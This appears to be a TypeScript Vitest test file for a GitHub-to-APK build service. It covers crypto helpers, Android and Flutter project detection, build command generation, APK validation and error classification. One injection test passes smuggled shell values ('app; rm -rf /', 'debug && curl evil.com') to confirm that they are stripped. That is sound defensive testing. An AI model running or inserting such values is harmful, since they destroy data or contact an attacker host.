import AdmZip from 'adm-zip';
import sodium from 'libsodium-wrappers';
import { beforeAll, describe, expect, it } from 'vitest';
import { extractApkFromGitHubArtifactZip, validateApkBuffer } from '@/lib/android/apk-validator';
import { computeBuildCommand } from '@/lib/android/command-builder';
import { analyzeAndroidProject, discoverCandidateProjectDirectories } from '@/lib/android/detector';
import { classifyBuildFailure } from '@/lib/android/error-classifier';
import {
  decryptSecret,
  encryptSecret,
  sealGitHubActionSecret,
  signSessionToken,
  verifyGitHubWebhookSignature,
  verifySessionToken,
} from '@/lib/crypto';
import crypto from 'node:crypto';

beforeAll(() => {
  process.env.TOKEN_ENCRYPTION_KEY = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
  process.env.SESSION_SECRET = 'super-secure-test-session-secret-key-32-plus-chars';
});

describe('Crypto & Security Primitives', () => {
  it('encrypts and decrypts secrets with AES-256-GCM and rejects tampered payloads', () => {
    const plain = 'ghu_realOAuthSecretTokenValue12345';
    const encrypted = encryptSecret(plain);
    expect(encrypted).not.toContain(plain);
    expect(encrypted.startsWith('v1:')).toBe(true);
    expect(decryptSecret(encrypted)).toBe(plain);

    const parts = encrypted.split(':');
    parts[3] = parts[3].slice(0, -2) + 'AA';
    expect(() => decryptSecret(parts.join(':'))).toThrow();
  });

  it('signs and verifies HMAC HttpOnly session tokens', () => {
    const token = signSessionToken({ userId: 'user-uuid-1', githubLogin: 'kirlous0' }, 3600);
    const verified = verifySessionToken(token);
    expect(verified?.userId).toBe('user-uuid-1');
    expect(verified?.githubLogin).toBe('kirlous0');

    expect(verifySessionToken(token + 'tampered')).toBeNull();
  });

  it('verifies GitHub webhook HMAC-SHA256 signatures accurately', () => {
    const body = JSON.stringify({ action: 'completed', workflow_run: { id: 42 } });
    const secret = 'webhook_test_secret_987';
    const sig = `sha256=${crypto.createHmac('sha256', secret).update(body).digest('hex')}`;
    expect(verifyGitHubWebhookSignature(body, sig, secret)).toBe(true);
    expect(verifyGitHubWebhookSignature(body, 'sha256=deadbeef', secret)).toBe(false);
    expect(verifyGitHubWebhookSignature(body, null, secret)).toBe(false);
  });

  it('seals GitHub Actions repository secrets using LibSodium crypto_box_seal', async () => {
    await sodium.ready;
    const kp = sodium.crypto_box_keypair();
    const pubB64 = sodium.to_base64(kp.publicKey, sodium.base64_variants.ORIGINAL);
    const sealedB64 = await sealGitHubActionSecret(pubB64, 'my-release-password');
    const sealedBytes = sodium.from_base64(sealedB64, sodium.base64_variants.ORIGINAL);
    const opened = sodium.crypto_box_seal_open(sealedBytes, kp.publicKey, kp.privateKey);
    expect(sodium.to_string(opened)).toBe('my-release-password');
  });
});

describe('Android Project Detection Engine', () => {
  it('detects Native Android Kotlin DSL multi-module projects with flavors and signing', async () => {
    const files: Record<string, string> = {
      'settings.gradle.kts': 'include(":app", ":core:network")',
      'build.gradle.kts': 'plugins { alias(libs.plugins.android.application) apply false }',
      'gradle/libs.versions.toml':
        '[versions]\nagp = "8.5.1"\nkotlin = "2.0.0"\n[plugins]\nandroid-application = { id = "com.android.application", version.ref = "agp" }',
      'gradle/wrapper/gradle-wrapper.properties':
        'distributionUrl=https\\://services.gradle.org/distributions/gradle-8.7-bin.zip',
      'app/build.gradle.kts': `
        plugins { alias(libs.plugins.android.application) }
        android {
          namespace = "com.example.wallet"
          compileSdk = 35
          defaultConfig {
            applicationId = "com.example.wallet"
            minSdk = 24
            targetSdk = 35
            versionCode = 14
            versionName = "2.1.0"
          }
          signingConfigs {
            create("release") {
              storeFile = file(System.getenv("KEYSTORE_PATH") ?: "release.jks")
            }
          }
          buildTypes {
            getByName("release") { isMinifyEnabled = true }
          }
          productFlavors {
            create("free") {}
            create("pro") {}
          }
        }
        dependencies {
          implementation("androidx.core:core-ktx:1.13.1")
        }
      `,
      'core/network/build.gradle.kts': 'plugins { id("com.android.library") }',
    };

    const tree = [...Object.keys(files), 'gradlew', 'app/src/main/java/MainActivity.kt'];
    const analysis = await analyzeAndroidProject({
      repoFullName: 'acme/wallet-android',
      branch: 'main',
      commitSha: '1234567890abcdef',
      projectDir: '.',
      treePaths: tree,
      fetchFile: async (p) => files[p] ?? null,
    });

    expect(analysis.isAndroidProject).toBe(true);
    expect(analysis.isBuildable).toBe(true);
    expect(analysis.framework).toBe('native_android');
    expect(analysis.language).toBe('Kotlin');
    expect(analysis.agpVersion).toBe('8.5.1');
    expect(analysis.gradleWrapperVersion).toBe('8.7');
    expect(analysis.packageId).toBe('com.example.wallet');
    expect(analysis.androidSdk.compileSdk).toBe('35');
    expect(analysis.androidSdk.minSdk).toBe('24');
    expect(analysis.applicationModules).toEqual(['app']);
    expect(analysis.availableVariants).toContain('proRelease');
    expect(analysis.existingSigning.hasReleaseSigningConfig).toBe(true);
  });

  it('detects Flutter Android projects and computes Flutter build commands', async () => {
    const files: Record<string, string> = {
      'pubspec.yaml': `
name: shop_mobile
version: 1.4.2+19
environment:
  sdk: ">=3.4.0 <4.0.0"
dependencies:
  flutter:
    sdk: flutter
  http: ^1.2.1
`,
      '.fvmrc': '{"flutter": "3.24.3"}',
      'android/app/build.gradle': `
android {
  compileSdkVersion 34
  defaultConfig {
    applicationId "com.shop.mobile"
    minSdkVersion 23
    targetSdkVersion 34
  }
}
`,
      'android/gradle/wrapper/gradle-wrapper.properties':
        'distributionUrl=https\\://services.gradle.org/distributions/gradle-8.3-all.zip',
    };

    const tree = [...Object.keys(files), 'android/gradlew', 'lib/main.dart'];
    const analysis = await analyzeAndroidProject({
      repoFullName: 'acme/shop-flutter',
      branch: 'main',
      commitSha: 'abcdef1234567890',
      projectDir: '.',
      treePaths: tree,
      fetchFile: async (p) => files[p] ?? null,
    });

    expect(analysis.isAndroidProject).toBe(true);
    expect(analysis.isBuildable).toBe(true);
    expect(analysis.framework).toBe('flutter');
    expect(analysis.flutterVersion).toBe('3.24.3');
    expect(analysis.versionName).toBe('1.4.2');
    expect(analysis.versionCode).toBe('19');
    expect(analysis.packageId).toBe('com.shop.mobile');

    const cmd = computeBuildCommand({
      analysis,
      buildType: 'release',
      abiMode: 'split',
      buildName: '1.5.0',
      buildNumber: '20',
    });
    expect(cmd.command).toBe(
      'flutter build apk --release --split-per-abi --build-name=1.5.0 --build-number=20'
    );
  });

  it('rejects Expo managed projects lacking native android/ directory (no WebView wrappers)', async () => {
    const files: Record<string, string> = {
      'package.json': JSON.stringify({
        name: 'expo-managed',
        dependencies: { expo: '^51.0.0', react: '18.2.0' },
      }),
    };
    const analysis = await analyzeAndroidProject({
      repoFullName: 'acme/expo-managed',
      branch: 'main',
      commitSha: 'aaaa1111bbbb2222',
      projectDir: '.',
      treePaths: ['package.json', 'App.tsx'],
      fetchFile: async (p) => files[p] ?? null,
    });

    expect(analysis.isAndroidProject).toBe(false);
    expect(analysis.isBuildable).toBe(false);
    expect(analysis.framework).toBe('unsupported');
  });

  it('rejects non-Android web repositories and discovers monorepo subdirectories', async () => {
    const tree = [
      'apps/web/package.json',
      'apps/mobile/pubspec.yaml',
      'apps/mobile/android/app/build.gradle',
      'apps/mobile/android/gradlew',
    ];
    const dirs = discoverCandidateProjectDirectories(tree);
    expect(dirs).toContain('apps/mobile');

    const analysis = await analyzeAndroidProject({
      repoFullName: 'acme/monorepo',
      branch: 'main',
      commitSha: 'deadbeef1234',
      projectDir: 'apps/web',
      treePaths: tree,
      fetchFile: async (p) =>
        p === 'apps/web/package.json'
          ? JSON.stringify({ name: 'web', dependencies: { next: '16.0.0' } })
          : null,
    });

    expect(analysis.isAndroidProject).toBe(false);
    expect(analysis.isBuildable).toBe(false);
  });

  it('sanitizes build command inputs against shell injection', () => {
    const cmd = computeBuildCommand({
      analysis: {
        framework: 'native_android',
        selectedModule: 'app',
      } as never,
      buildType: 'debug',
      applicationModule: 'app; rm -rf /',
      buildVariant: 'debug && curl evil.com',
    });
    expect(cmd.command).toBe('./gradlew :app:assembleDebug --no-daemon');
  });
});

describe('APK Validation & Error Classification', () => {
  it('validates real APK archive structure and rejects fake APKs', () => {
    const validZip = new AdmZip();
    validZip.addFile('AndroidManifest.xml', crypto.randomBytes(2048));
    validZip.addFile('classes.dex', crypto.randomBytes(4096));
    validZip.addFile('resources.arsc', crypto.randomBytes(1024));
    const apkBuf = validZip.toBuffer();

    const okResult = validateApkBuffer(apkBuf, 'app-debug.apk', null, true);
    expect(okResult.isValidApk).toBe(true);
    expect(okResult.signingStatus).toBe('debug_signed');
    expect(okResult.sha256).toHaveLength(64);

    // Fake APK (plain text renamed .apk)
    const fakeResult = validateApkBuffer(Buffer.from('not-an-apk'), 'fake.apk');
    expect(fakeResult.isValidApk).toBe(false);
    expect(fakeResult.validationErrors.length).toBeGreaterThan(0);

    // Extract from GitHub Actions artifact zip while skipping androidTest
    const ghZip = new AdmZip();
    ghZip.addFile('app-debug-androidTest.apk', apkBuf);
    ghZip.addFile('app-release.apk', apkBuf);
    ghZip.addFile(
      'repo2apk-metadata.json',
      Buffer.from(JSON.stringify({ packageId: 'com.acme.test', sha256: okResult.sha256 }))
    );
    const extracted = extractApkFromGitHubArtifactZip(ghZip.toBuffer());
    expect(extracted?.apkFileName).toBe('app-release.apk');
    expect(extracted?.metadata?.packageId).toBe('com.acme.test');
  });

  it('classifies real Gradle/Java/SDK/Flutter/Signing errors accurately', () => {
    expect(
      classifyBuildFailure({
        logText: 'Unsupported class file major version 65. Android Gradle plugin requires Java 17',
      }).code
    ).toBe('INCOMPATIBLE_JAVA_VERSION');

    expect(
      classifyBuildFailure({
        logText: 'Failed to install the following Android SDK packages as some licences have not been accepted.',
      }).code
    ).toBe('ANDROID_SDK_CONFIG_ERROR');

    expect(
      classifyBuildFailure({
        logText: 'Could not resolve all files for configuration :app:debugRuntimeClasspath.',
      }).code
    ).toBe('DEPENDENCY_RESOLUTION_ERROR');

    expect(
      classifyBuildFailure({
        logText: 'Target kernel_snapshot_program failed: Exception',
        framework: 'flutter',
      }).code
    ).toBe('FLUTTER_COMPILATION_ERROR');
  });
});
